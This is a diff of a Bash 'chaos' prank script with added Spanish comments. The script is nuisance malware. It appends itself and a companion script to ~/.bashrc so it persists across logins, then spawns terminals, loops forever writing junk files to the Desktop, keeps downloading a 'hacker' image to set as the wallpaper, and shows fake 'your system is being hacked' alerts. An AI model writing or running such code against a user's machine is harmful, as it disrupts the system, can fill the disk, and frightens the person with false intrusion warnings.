@@ -1,24 +1,40 @@
 #!/bin/bash
+
+# Definimos un nombre para la búsqueda en Google
 NOMBRE="SOY TU PEOR PESADILLA"
+
+# Abre una búsqueda en Google con el nombre definido
 xdg-open "https://www.google.com/search?q=${NOMBRE}"
+
+# URL de una imagen de "hacker"
 HACK_IMAGE="https://i.imgur.com/EsnPdi3.jpg"
+
+# Espera 2 segundos antes de abrir la imagen
 sleep 2
 xdg-open "${HACK_IMAGE}"
-#chmod +x open_google.sh
+
+# Agrega este script al archivo .bashrc para ejecutarse en cada inicio de sesión
+# Esto intenta persistir el script en la configuración del usuario
 echo "$(pwd)/open_google.sh" >> ~/.bashrc
 
+# Si el script 'chaos_script.sh' no está en .bashrc, lo añade para persistencia
 if ! grep -q "$(pwd)/chaos_script.sh" ~/.bashrc; then
     echo "$(pwd)/chaos_script.sh" >> ~/.bashrc
 fi
 
+# Captura la hora actual en formato HHMM
 HORA=$(date +"%H%M")
 
+# Define el número de terminales a abrir
 NUM_TERMINALES=5
 
+# Define la ruta del escritorio del usuario
 ESCRITORIO="$HOME/Escritorio"
 
+# Ruta temporal para almacenar un fondo de pantalla modificado
 FONDO_TEMPORAL="/tmp/hack_background.jpg"
 
+# Función para abrir terminales con mensajes de "caos"
 launch_terminal() {
   gnome-terminal -- bash -c "
   echo '🔥 Modo caos activado 🔥';
@@ -33,6 +49,7 @@ launch_terminal() {
   exec bash"
 }
 
+# Función para generar archivos de texto basura en el escritorio
 generate_trash_files() {
   while true; do
     BASURA="$ESCRITORIO/hack_\$RANDOM.txt"
@@ -41,6 +58,7 @@ generate_trash_files() {
   done
 }
 
+# Función para cambiar el fondo de pantalla repetidamente
 change_wallpaper() {
   while true; do
     wget -O "$FONDO_TEMPORAL" "$HACK_IMAGE" -q
@@ -49,14 +67,18 @@ change_wallpaper() {
   done
 }
 
+# Lanza múltiples terminales en segundo plano
 for ((i = 1; i <= NUM_TERMINALES; i++)); do
   launch_terminal &
 done
 
+# Inicia la generación de archivos basura en segundo plano
 generate_trash_files &
 
+# Inicia el cambio de fondo de pantalla en segundo plano
 change_wallpaper &
 
+# Bucle infinito para mostrar notificaciones de advertencia
 while true; do
   notify-send "💀 ALERTA 💀" "Tu sistema está siendo hackeado..."
   sleep 3
